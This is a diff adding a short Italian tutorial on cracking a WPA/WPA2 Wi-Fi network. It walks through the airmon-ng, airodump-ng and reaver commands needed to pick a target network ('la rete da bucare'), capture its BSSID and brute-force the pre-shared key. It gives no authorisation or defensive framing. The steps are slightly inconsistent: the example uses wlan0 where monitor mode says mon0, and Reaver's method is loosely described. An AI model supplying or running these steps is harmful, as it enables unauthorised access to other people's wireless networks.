@@ -1,0 +1,20 @@
+Mettere la scheda wireless in modalità monitor eseguendo il comando:
+airmon-ng start wlan0 (Supponendo che il nome di interfaccia sia wlan0).
+Con questo comando il nome di interfaccia in modalità monitor sarà mon0.
+Eseguire il comando:
+airodump-ng wlan0 (Se airodump-ng wlan0 non funzionasse, provare il comando usando l’interfaccia monitor, quindi, ad esempio, airodump-ng mon0).
+Trovata la la rete da bucare, premere Ctrl+C per fermare la lista e copiare il BSSID della rete (è la serie di lettere, numeri e due punti nella colonna a sinistra).
+La rete dovrebbe essere di tipo WPA o WPA2 nella colonna ENC.
+
+Ora avviare Reaver eseguendo il seguente comando nel terminale e sostituendo il BSSID ed il nome monitor dell’interfaccia di rete:
+reaver -i mon0 -b bssid -vv
+Per esempio, può essere 
+
+reaver -i wlan0 -b 12:13:31:76:DE:EC -vv 
+
+Reaver adesso comincerà a lavorare tentando una serie di chiavi e password in un attacco BruteForce.
+Reaver ci potrà mettere diverse ore, tra le 4 e le 10 ore prima di tirare fuori un risultato che indica in chiaro la chiave WPA PSK.
+
+Questo è tutto, tenere però a mente che Reaver non funziona su tutti i router, ma solo alcuni e che il segnale della Wifi deve essere abbastanza forte.
+Si può mettere in pausa Reaver premendo Ctrl + C per riprendere poi, rilanciando il comando, da dove si era interrotto.
+
